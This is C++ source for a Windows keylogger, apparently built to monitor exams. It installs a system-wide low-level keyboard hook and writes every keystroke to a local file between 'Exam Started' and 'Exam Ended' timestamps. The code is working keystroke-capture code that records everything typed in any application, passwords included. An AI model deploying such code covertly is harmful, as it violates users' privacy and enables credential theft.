#include "keylogger.h"

KeyLogger keylogger;

/**
 * @brief Starts logging keystrokes to a file.
 * @param filename Name of the file to write keystrokes.
 * @return True if logging started successfully, false otherwise.
 *
 * Opens the file in overwrite mode, writes an "Exam Started" timestamp,
 * and sets the internal logging flag.
 */
bool KeyLogger::startLogging(const string &filename)
{
    keyStrokes.open(filename, ios::out | ios::trunc);
    
    if (!keyStrokes.is_open()) {
        return false;
    }

    isLogging = true;

    keyStrokes << "=== Exam Started: " << getCurrentTime() << "===\n";

    return true;
}

/**
 * @brief Stops logging and closes the log file.
 *
 * Writes an "Exam Ended" timestamp and clears the logging flag.
 */
void KeyLogger::stopLogging()
{
    if (isLogging) {
        keyStrokes << "\n=== Exam Ended: " << getCurrentTime() << "===\n";

        keyStrokes.close();

        isLogging = false;
    }
}

/**
 * @brief Logs a single key press.
 * @param key Virtual-key code of the key.
 *
 * Converts printable ASCII characters to text,
 * special keys to readable names, and flushes the output immediately.
 */
void KeyLogger::logKey(int key)
{
    if (!isLogging) {
        return;
    }

    if (key >= 32 && key <= 126) {
        keyStrokes << (char) key;
    }
    else {
        switch (key)
        {
        case VK_RETURN:
            keyStrokes << "\n";
            break;
        case VK_BACK:
            keyStrokes << "[BACKSPACE]";
            break;
        case VK_DELETE:
            keyStrokes << "[DELETE]";
            break;
        case VK_TAB:
            keyStrokes << "[TAB]";
            break;
        case VK_ESCAPE:
            keyStrokes << "[ESC]";
            break;
        case VK_CONTROL:
            keyStrokes << "[CTRL]";
            break;
        case VK_LEFT:
            keyStrokes << "[LEFT]";
            break;
        case VK_RIGHT:
            keyStrokes << "[RIGHT]";
            break;
        case VK_UP:
            keyStrokes << "[UP]";
            break;
        case VK_DOWN:
            keyStrokes << "[DOWN]";
            break;

        default:
            keyStrokes << "[KEY:" << key << "]";
            break;
        }
    }

    keyStrokes.flush();
}

/**
 * @brief Gets the current system time as a human-readable string.
 * @return Current time as string without trailing newline.
 */
string KeyLogger::getCurrentTime()
{
    time_t now = time(0);

    char *timeStr = ctime(&now);

    string currentTime(timeStr);

    currentTime.pop_back();

    return currentTime;
}

/**
 * @brief Callback function for low-level keyboard events.
 * @param nCode Hook code.
 * @param wParam Type of keyboard message (WM_KEYDOWN, etc.).
 * @param lParam Pointer to KBDLLHOOKSTRUCT with key information.
 * @return LRESULT value returned to CallNextHookEx.
 *
 * Logs keys when WM_KEYDOWN is detected.
 */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;

        keylogger.logKey(pKeyBoard->vkCode);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/**
 * @brief Entry point of the keylogger application.
 * @param argc Number of command-line arguments.
 * @param argv Array of command-line arguments.
 * @return Exit status code.
 *
 * - Saves current thread ID to file for external stop control.
 * - Starts logging to a file specified in argv[1] or default.
 * - Installs low-level keyboard hook.
 * - Runs a message loop to wait for WM_STOP.
 * - Cleans up hook and log file on exit.
 */
int main(int argc, char *argv[])
{
    DWORD keyloggerThreadId = GetCurrentThreadId();

    ofstream("keyloggerThread.id") << keyloggerThreadId;

    string logFileName = (argc > 1) ? argv[1] : "keyStrokes.txt";

    if (!keylogger.startLogging(logFileName)) {
        MessageBoxA(NULL, "Failed to start logging", "Keylogger Failed", MB_ICONERROR | MB_OK);

        return 1;
    }

    HHOOK hook = SetWindowsHookEx(
        WH_KEYBOARD_LL, KeyboardProc,
        GetModuleHandle(NULL), 0);

    if (!hook) {
        MessageBoxA(NULL, "Failed to install hook", "Keylogger Failed", MB_ICONERROR | MB_OK);

        return 1;
    }

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_STOP) {
            break;
        }

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    keylogger.stopLogging();

    return 0;
}